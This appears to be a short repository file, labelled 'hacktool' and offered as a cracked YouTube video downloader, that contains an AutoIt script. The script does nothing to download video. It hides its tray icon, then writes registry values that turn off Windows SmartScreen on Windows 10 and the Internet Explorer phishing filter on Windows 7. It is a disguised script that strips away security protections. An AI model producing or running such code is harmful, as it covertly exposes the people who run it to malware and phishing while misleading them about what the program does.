# hacktool

youtube vedio download with crack

ad35a233a3421934b9b7b7514c4fbface48ecc6b1eadb99422057dabbdb15cbb


#for disabling AutoItSetOption("TrayIconHide", 0x1)
AutoItSetOption("TrayAutoPause", 0x0)
AutoItSetOption("MouseCoordMode", 0x0)
Local $type = @OSArch
Local $ver = @OSVersion
Local $regpath, $pathfile, $user, $pass, $valid1, $valid4, $uac, $signal
If $type = "X86" Then
    $pathfile = "C:\Program Files"
    $regpath = "HKLM\Software"
Else
    $pathfile = "C:\Program Files (X86)"
    $regpath = "HKLM\Software\Wow6432Node"
EndIf
If $ver = "Win_10" Then
    RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System", "EnableSmartScreen", "REG_DWORD", "0")
ElseIf $ver = "Win_7" Then
    RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\PhishingFilter", "EnableV9", "REG_DWORD", "0")
EndIf
Sleep(0x5dc)
Exit
